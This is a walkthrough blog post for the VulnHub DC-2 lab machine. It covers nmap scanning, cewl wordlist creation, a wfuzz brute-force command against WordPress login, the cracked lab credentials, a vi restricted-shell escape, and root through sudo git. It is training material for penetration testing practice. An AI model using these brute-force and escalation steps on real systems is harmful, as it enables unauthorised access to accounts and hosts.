---
layout: "post"
title: "DC 2 Walkthrough"
categories: [vulnhub, DC-Series]
tags: [dc-2, easy, wordpress, suid]
---

DC-2 is an easy machine. This machine starts with a `WordPress site`. After brute-forcing, We find out creds on the website that we use to get an `ssh session` on the box. Priv sec to root by exploiting `git SUID binary`.
# Summary
- Portscan
- Adding Domain to Host file
- Finding users on wordpress 
- Creating wordlist
- Bruteforce
- Logging in Wordpress
- SSH shell
- Updating low shell to higher shell
- Privilege Escalation
- Getting ROOT

# Portscan

```
Nmap scan report for 192.168.1.10
Host is up (0.00047s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap scan show that port 80 and 7744 are open

```
Port 80: On this port, I find out a Domain name. I added to /etc/hosts file and surf the page. I discovered that WordPress is installed.

Port 7744: They are running SSH on this port. So I don't have any credentials so I moved forward.
```
# Initial Shell:

## Flag 1:
I got the first flag on the Main page
![flag1](/assets/img/dc-2/flag1.png)



As per hint in the first flag, I created a password list using cewl.

```bash
cewl -w password.txt http://dc-2
```

After that, I use wpscan to identify possible users and I found 3 users.

![wpscan](/assets/img/dc-2/wpscan.png)

Users :-
- admin
- jerry
- tom

Now I have a password and user list so I brute force the wordpress.
Here I use wfuzz to brute force.

```bash
wfuzz -c --hc=200 -z file,users.txt -z file,password.txt -d 'log=FUZZ&pwd=FUZ2Z&wp-submit=Log+In' http://dc-2/wp-login.php
```

![wfuzz](/assets/img/dc-2/wfuzz.png)

Here I got 2 passwords.
- ```jerry:adipiscing```
- ```tom:parturient```

## Flag 2:
I use jerry password to access wordpress panel and got second flag.

![flag2](/assets/img/dc-2/flag2.png)

## First User:
I spend some time to upload php reverse shell, but no luck :(
Then I tried same creds to access SSH on port 7744.
``` $ ssh tom@dc-2 -p 7744```

## Updating shell:

I tried to cat the flag3.txt but no luck. We are in a restricted shell. I checked usr/bin directory and PATH variable I noticed that tom is using binaries from that directory.
Here I learned new things about how to launch a shell using vi.

Steps:

1. Open VI editor 
2. Press ESC + :
3. set shell=/bin/bash
4. Again step 1 and 2 
5. shell

So I have shell using VI.

Now I am out of restricted shell but still using commands in usr/bin directory. I need to change PATH variable.

```export PATH=/bin:/usr/bin:$PATH```

## Flag 3:
Now I am able to cat the third flag.

![flag 3](/assets/img/dc-2/flag3.png)

## Second User:
Flag gives hint we need to switch user i.e jerry.

>jerry:adipiscing

![user2](/assets/img/dc-2/user2.png)

# Privesc to root:

Now I checked the sudoers list and found that I can run git without password.
![sudoer](/assets/img/dc-2/sudoer.png)

After some googling I found a [link](https://gtfobins.github.io/gtfobins/git/#shell).
![gtfobins](/assets/img/dc-2/gtfobins.png)

![git](/assets/img/dc-2/git.png)

## Final Flag
![final](/assets/img/dc-2/final.png)


